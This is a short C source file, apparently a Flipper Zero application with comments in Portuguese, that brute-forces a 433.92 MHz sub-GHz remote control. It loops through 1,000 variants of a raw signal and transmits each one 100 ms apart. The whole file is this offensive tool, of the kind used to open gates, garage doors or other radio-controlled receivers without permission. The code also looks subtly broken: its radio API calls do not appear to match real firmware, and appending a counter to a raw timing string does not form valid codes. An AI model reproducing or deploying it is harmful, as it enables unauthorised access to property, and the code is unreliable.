#include <furi.h>
#include <gui/gui.h>
#include <subghz/subghz.h>

void bruteforce_run(void* p) {
    SubGhzTxResult tx_result;
    uint32_t frequency = 433920000; // Frequência alvo
    char base_signal[] = "5535 -6132 65 -330 231 -98 131 -726"; // Sinal base
    char buffer[128];

    furi_assert(subghz_init());

    for(int i = 0; i < 1000; i++) { // Tente até 1000 combinações
        snprintf(buffer, sizeof(buffer), "%s %d", base_signal, i);

        // Enviar o sinal SubGHz
        tx_result = subghz_tx(frequency, buffer, SubGhzProtocolCustom);
        if(tx_result != SubGhzTxResultOk) {
            FURI_LOG_E("Bruteforce", "Erro ao transmitir: %d", tx_result);
            break;
        }
        furi_delay_ms(100); // Pequeno atraso entre transmissões
    }

    subghz_deinit();
}

int32_t bruteforce_app(void* p) {
    Gui* gui = furi_record_open(RECORD_GUI);
    ViewPort* view_port = view_port_alloc();
    view_port_draw_callback_set(view_port, NULL, NULL);

    gui_add_view_port(gui, view_port, GuiLayerFullscreen);
    view_port_update(view_port);

    bruteforce_run(NULL);

    gui_remove_view_port(gui, view_port);
    view_port_free(view_port);
    furi_record_close(RECORD_GUI);

    return 0;
}
